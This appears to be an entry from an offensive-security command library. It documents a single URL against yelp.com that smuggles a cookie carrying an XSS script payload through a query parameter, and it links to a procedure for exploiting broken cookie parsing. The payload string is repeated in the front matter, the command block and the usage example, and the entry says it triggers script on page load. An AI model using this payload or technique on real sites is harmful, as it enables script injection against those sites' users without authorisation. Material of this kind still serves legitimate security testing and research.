---
data: >-
  https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
tags:
  - cookie-smuggling
  - xss
type: command
executor: bash
platforms:
  - Web
id: 0ce2d9f5-faf6-4d16-aa5f-cd90423cfbae
created_at: '2025-12-13T23:56:20.366Z'
updated_at: '2025-12-13T23:56:20.366Z'
verified: false
validated: true
submitted: true
---
# set-smuggled-guvo-cookie-xss

## Command

```bash
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

## Description

URL to set smuggled guvo cookie with XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `canary` | Smuggled value | Yes |

## Examples

### Basic Usage

```bash
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

## Expected Output

Sets cookie and triggers alert on page load

## Related

- [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]
